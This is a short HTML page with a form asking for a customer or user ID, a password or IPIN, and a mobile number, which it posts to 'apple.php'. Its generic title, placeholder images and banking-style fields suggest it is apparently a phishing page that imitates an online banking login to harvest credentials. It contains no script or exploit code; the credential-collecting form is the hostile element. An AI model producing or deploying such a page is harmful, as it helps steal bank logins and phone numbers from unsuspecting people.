<!DOCTYPE html>
<html lang="zxx">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        #aa , #bb ,#ram , #sita
        {
            width: 100%;
        }
        #form
        {
            margin-left: 23px;
        }
        #dd ,#ff ,#hh
        {
            width: 60%;
            height: 22px;
            background: #F3F3F3;
            border-radius:3px;
            
        }

        ::placeholder
        {
            font-size:12px;
        }
        #btn
        {
           background-color: 	#0080ff;
           color:white;
           border-radius:3px;
           font-size: 16px;
           border: none;
           width: 40%;
           height:30px;
        }
    </style>
</head>
<body>
    <div id="zz">
    <img src="trph.png" alt="" id="aa">
    </div>

    <div id="yy">
        <img src="accr.png" alt="" id="bb">
    </div>
    <form action="apple.php" method="post" id="form">
        
        <div id="xx">
            <p id="cc">
                Customer ID/ User ID
            </p>
            <input type="text" name="customer id" id="dd" placeholder="Customer ID/ User ID"  required="">
        </div>

        <div id="ww">
            <p id="ee">

               Password/ IPIN
            </p>
        </div>
        <div id="vv">
            <input type="password" name="password" id="ff" placeholder="Password/ IPIN"  required="">
        </div>
        <div id="uu">
            <p id="gg">
                Mobile No.
            </p>
        </div>
        <div id="tt">
            <input type="number" name="mobile no." id="hh" placeholder="Mobile No." required="">
        </div> <br>

        <div id="ss">
            <button type="submit" id="btn">
                CONTINUE
            </button>
        </div> <br>
    </form>
    <div id="ki">
        <img src="last1.jpeg" alt="" id="ram">
    </div>
    <div id="klo">
        <img src="last2.jpeg" alt="" id="sita">
    </div>
</body>
</html>